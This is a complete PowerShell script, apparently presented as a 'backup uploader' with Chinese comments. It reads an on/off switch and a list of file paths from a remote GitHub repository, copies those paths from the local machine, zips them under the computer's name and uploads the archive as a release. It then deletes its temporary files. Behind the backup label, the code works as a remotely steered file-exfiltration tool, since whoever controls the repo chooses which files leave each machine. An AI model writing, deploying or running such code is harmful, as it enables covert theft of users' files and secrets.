# uploader.ps1 - 带远程开关的 GitHub 上传脚本

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "ertgyhujkfghj/2"
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Write-Host "❌ GITHUB_TOKEN 未设置，脚本终止。"
    exit 1
}

# 远程开关检查
$switchUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-switch.txt"
try {
    $switchState = (Invoke-RestMethod -Uri $switchUrl -UseBasicParsing -ErrorAction Stop).Trim().ToLower()
    if ($switchState -ne "on") {
        Write-Host "🔕 开关为 OFF，跳过上传。"
        exit 0
    }
    Write-Host "🔔 开关为 ON，继续执行上传任务..."
} catch {
    Write-Warning "⚠️ 无法获取远程开关，终止。"
    exit 1
}

# 获取路径列表
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-paths.txt"
try {
    $paths = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop |
        ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    Write-Error "❌ 无法获取路径列表"
    exit 1
}

# 准备文件压缩目录
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 拷贝路径
$index = 0
foreach ($path in $paths) {
    if (Test-Path $path) {
        $index++
        $dest = Join-Path $workDir "item$index"
        try {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Warning "⚠️ 拷贝失败：$path"
        }
    } else {
        Write-Warning "❌ 路径不存在：$path"
    }
}

# 压缩
$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

# 上传
$apiUrl = "https://api.github.com/repos/$repo/releases"
$releaseData = @{
    tag_name   = $tag
    name       = "Backup $tag"
    body       = "自动上传数据"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $releaseData
    $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"

    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
    }

    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

# 清理
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
